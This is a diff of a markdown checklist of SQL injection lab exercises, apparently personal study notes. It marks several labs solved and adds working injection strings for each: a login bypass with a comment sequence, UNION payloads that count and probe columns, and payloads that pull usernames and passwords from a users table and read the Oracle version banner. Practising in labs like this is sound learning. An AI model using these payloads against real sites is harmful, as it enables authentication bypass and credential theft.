@@ -12,15 +12,25 @@
     `csrf=ok13OxKIWATN6nuJiviRmIaPQBeSNtTB&username=administrator'--&password=test`
     
 
-- [ ] SQL injection UNION attack, determining the number of columns returned by the query
+- [X] SQL injection UNION attack, determining the number of columns returned by the query
 
-- [ ] SQL injection UNION attack, finding a column containing text
+    `?category=Pets'+UNION+SELECT+NULL,NULL,NULL--`
 
-- [ ] SQL injection UNION attack, retrieving data from other tables
+- [X] SQL injection UNION attack, finding a column containing text
 
-- [ ] SQL injection UNION attack, retrieving multiple values in a single column
+    `?category=Pets'+UNION+SELECT+NULL,'3QFtaD',NULL--`
 
-- [ ] SQL injection attack, querying the database type and version on Oracle
+- [X] SQL injection UNION attack, retrieving data from other tables
+
+    `?category=Gifts'+UNION+SELECT+username,password+from+users--`
+
+- [X] SQL injection UNION attack, retrieving multiple values in a single column
+
+    `?category=Pets'+UNION+SELECT+NULL,CONCAT(username,'+',password)+FROM+users--`
+    
+- [X] SQL injection attack, querying the database type and version on *Oracle*
+
+    `?category=Pets'+UNION+SELECT+'a',banner+FROM+v$version--`
 
 - [ ] SQL injection attack, querying the database type and version on MySQL and Microsoft
 
